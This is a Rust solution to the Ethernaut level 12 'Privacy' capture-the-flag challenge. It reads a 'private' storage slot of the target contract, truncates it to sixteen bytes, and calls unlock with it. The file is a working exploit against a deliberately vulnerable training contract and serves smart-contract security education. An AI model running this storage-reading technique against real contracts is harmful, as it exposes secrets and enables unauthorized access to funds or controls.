//! Ethernaut 12 — Privacy.
//!
//! Goal: Unlock the `Privacy` contract so that its `locked` flag becomes false.
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/Privacy.sol

use alloy::primitives::{FixedBytes, U256};
use alloy::providers::Provider;
use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl12_privacy::*;

pub struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        let provider = offender.provider();

        // there are five state variables before the fixed size array, which
        // solidity unpacks into exact slots, so index 5 points us at the 2nd
        // element of the array with the key
        let location = U256::from(5);

        let slot = provider.get_storage_at(target.address, location).await?;

        // bytes16 truncates bytes32 and keeps only the first 16 bytes
        let key =
            FixedBytes::from_slice(&slot.to_be_bytes_vec().as_slice()[0..16]);

        let contract = Privacy::new(target.address, provider);
        contract.unlock(key).send().await?.watch().await?;

        Ok(())
    }
}
